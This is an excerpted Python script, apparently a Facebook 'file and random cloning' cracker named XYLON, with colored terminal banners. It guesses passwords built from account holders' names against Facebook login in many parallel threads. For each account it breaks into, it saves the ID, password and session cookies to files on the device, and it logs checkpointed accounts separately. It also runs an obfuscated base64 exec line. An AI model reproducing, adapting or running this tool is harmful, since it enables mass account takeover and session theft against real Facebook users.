...
cok,plist = [],[]
import base64
exec(base64.b64decode(b'I19fX19fX19fX19fX19fX19fX1sgU1lTIF1fX19fX19fX19fX19fX19fX18jCnN5cy5zdGRvdXQud3JpdGUoJ1x4MWJdMjsg8J+UsFhZTE9O8J+UsFx4MDcnKQ=='))
...
░░   ░▒ ░ ▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ...
 ░    ░   ░ ░         ░  ░    ░ ░           ░ 
          ░ ░                              " {G1}[{A}V{G1}/{A}7.9{G1}]
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} XYLON
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} XYLON\_____:*\❷/3:)\⓿
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} @Abdullha_404
{A}──────────────────────────────────────────────────"""
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/XYLON.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}XYLON-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);XYLONb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={XYLONb};{ckkk}"
                    print(f"\r\r{G1}[XYLON-OK] {sid} | {ps} ")
                    open('/sdcard/XYLON-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[XYLON-CP] {sid} | {ps} ")
                     open('/sdcard/XYLON-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}XYLON-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);XYLONb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={XYLONb};{ckkk}"
                    print(f"\r\r{G1}[XYLON-OK] {sid} | {ps} ")
                    open('/sdcard/XYLON-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[XYLON-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=30) as XYLONworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                XYLONworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                XYLONworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}XYLON-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[XYLON-OK] {uid} | {pas}')
